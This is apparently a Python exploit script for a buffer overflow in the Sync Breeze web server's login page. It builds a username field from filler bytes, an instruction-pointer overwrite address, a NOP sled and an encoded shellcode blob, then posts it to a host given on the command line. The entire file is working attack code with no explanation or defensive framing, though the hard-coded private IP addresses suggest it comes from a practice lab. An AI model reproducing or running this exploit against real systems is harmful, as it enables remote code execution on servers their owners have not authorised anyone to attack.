#!/usr/bin/python3
#
# Sync breeze buffer overflow

import requests
import argparse

# Script arguments
parser = argparse.ArgumentParser(description='Sync breeze buffer overflow')
parser.add_argument('host', help='host to target')
args = parser.parse_args()

url = f"http://{args.host}/login"

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Origin": "http://192.168.199.10",
    "Referer": "http://192.168.199.10/login",
    "Upgrade-Insecure-Requests": "1",
}

print(f"starting overflow on {url}")



filler = 'A'.encode('latin-1') * 780
eip = "\x83\x0c\x09\x10".encode('latin-1')
offset = 'C'.encode('latin-1') * 4
nops = "\x90".encode('latin-1') * 10
payload = ("\xda\xc2\xbd\xba\xeb\xd8\x72\xd9\x74\x24\xf4\x5b\x29\xc9\xb1"
"\x52\x83\xc3\x04\x31\x6b\x13\x03\xd1\xf8\x3a\x87\xd9\x17\x38"
"\x68\x21\xe8\x5d\xe0\xc4\xd9\x5d\x96\x8d\x4a\x6e\xdc\xc3\x66"
"\x05\xb0\xf7\xfd\x6b\x1d\xf8\xb6\xc6\x7b\x37\x46\x7a\xbf\x56"
"\xc4\x81\xec\xb8\xf5\x49\xe1\xb9\x32\xb7\x08\xeb\xeb\xb3\xbf"
"\x1b\x9f\x8e\x03\x90\xd3\x1f\x04\x45\xa3\x1e\x25\xd8\xbf\x78"
"\xe5\xdb\x6c\xf1\xac\xc3\x71\x3c\x66\x78\x41\xca\x79\xa8\x9b"
"\x33\xd5\x95\x13\xc6\x27\xd2\x94\x39\x52\x2a\xe7\xc4\x65\xe9"
"\x95\x12\xe3\xe9\x3e\xd0\x53\xd5\xbf\x35\x05\x9e\xcc\xf2\x41"
"\xf8\xd0\x05\x85\x73\xec\x8e\x28\x53\x64\xd4\x0e\x77\x2c\x8e"
"\x2f\x2e\x88\x61\x4f\x30\x73\xdd\xf5\x3b\x9e\x0a\x84\x66\xf7"
"\xff\xa5\x98\x07\x68\xbd\xeb\x35\x37\x15\x63\x76\xb0\xb3\x74"
"\x79\xeb\x04\xea\x84\x14\x75\x23\x43\x40\x25\x5b\x62\xe9\xae"
"\x9b\x8b\x3c\x60\xcb\x23\xef\xc1\xbb\x83\x5f\xaa\xd1\x0b\xbf"
"\xca\xda\xc1\xa8\x61\x21\x82\x16\xdd\x5e\xa0\xff\x1c\xa0\x45"
"\xbb\xa8\x46\x2f\xab\xfc\xd1\xd8\x52\xa5\xa9\x79\x9a\x73\xd4"
"\xba\x10\x70\x29\x74\xd1\xfd\x39\xe1\x11\x48\x63\xa4\x2e\x66"
"\x0b\x2a\xbc\xed\xcb\x25\xdd\xb9\x9c\x62\x13\xb0\x48\x9f\x0a"
"\x6a\x6e\x62\xca\x55\x2a\xb9\x2f\x5b\xb3\x4c\x0b\x7f\xa3\x88"
"\x94\x3b\x97\x44\xc3\x95\x41\x23\xbd\x57\x3b\xfd\x12\x3e\xab"
"\x78\x59\x81\xad\x84\xb4\x77\x51\x34\x61\xce\x6e\xf9\xe5\xc6"
"\x17\xe7\x95\x29\xc2\xa3\xb6\xcb\xc6\xd9\x5e\x52\x83\x63\x03"
"\x65\x7e\xa7\x3a\xe6\x8a\x58\xb9\xf6\xff\x5d\x85\xb0\xec\x2f"
"\x96\x54\x12\x83\x97\x7c").encode('latin-1')

username = filler + eip + offset + nops + payload

data = {
    "username": username,
    "password": "something"
}
try:
    response = requests.post(url, data=data, headers=headers, timeout=10)
    print("received response, overflow failed")
except requests.exceptions.ReadTimeout:
    print("request timed out")
